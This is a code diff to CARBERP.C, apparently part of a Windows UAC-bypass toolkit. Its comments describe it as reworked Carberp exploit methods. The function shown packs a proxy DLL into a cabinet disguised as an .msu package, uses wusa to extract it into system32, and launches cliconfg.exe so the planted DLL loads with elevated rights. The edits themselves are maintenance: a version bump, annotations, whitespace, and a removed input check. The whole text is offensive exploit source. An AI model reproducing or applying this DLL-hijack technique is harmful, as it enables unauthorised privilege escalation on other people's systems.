@@ -4,9 +4,9 @@
 *
 *  TITLE:       CARBERP.C
 *
-*  VERSION:     2.75
+*  VERSION:     2.85
 *
-*  DATE:        30 June 2017
+*  DATE:        01 Dec 2017
 *
 *  Tweaked Carberp methods.
 *  Original Carberp is exploiting mcx2prov.exe in ehome.
@@ -29,18 +29,14 @@
 */
 BOOL ucmWusaMethod(
     _In_ UCM_METHOD Method,
-    PVOID ProxyDll,
-    DWORD ProxyDllSize
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
     BOOL   bResult = FALSE;
     WCHAR  szSourceDll[MAX_PATH * 2];
     WCHAR  szTargetProcess[MAX_PATH * 2];
     WCHAR  szTargetDirectory[MAX_PATH * 2];
-
-    if ((ProxyDll == NULL) || (ProxyDllSize == 0)) {
-        return FALSE;
-    }
 
     _strcpy(szTargetProcess, g_ctx.szSystemDirectory);
     _strcpy(szTargetDirectory, g_ctx.szSystemDirectory);
@@ -64,7 +60,7 @@ BOOL ucmWusaMethod(
     // szTargetDirectory is system32
     //
     case UacMethodCarberp2:
-        _strcat(szSourceDll, NTWDBLIB_DLL);       
+        _strcat(szSourceDll, NTWDBLIB_DLL);
         _strcat(szTargetProcess, CLICONFG_EXE);
         break;
 
@@ -82,10 +78,10 @@ BOOL ucmWusaMethod(
     // First, create cab with fake msu ext, second run fusion process.
     //
     if (ucmCreateCabinetForSingleFile(
-        szSourceDll, 
-        ProxyDll, 
-        ProxyDllSize, 
-        NULL)) 
+        szSourceDll,
+        ProxyDll,
+        ProxyDllSize,
+        NULL))
     {
 
         if (ucmWusaExtractPackage(szTargetDirectory)) {
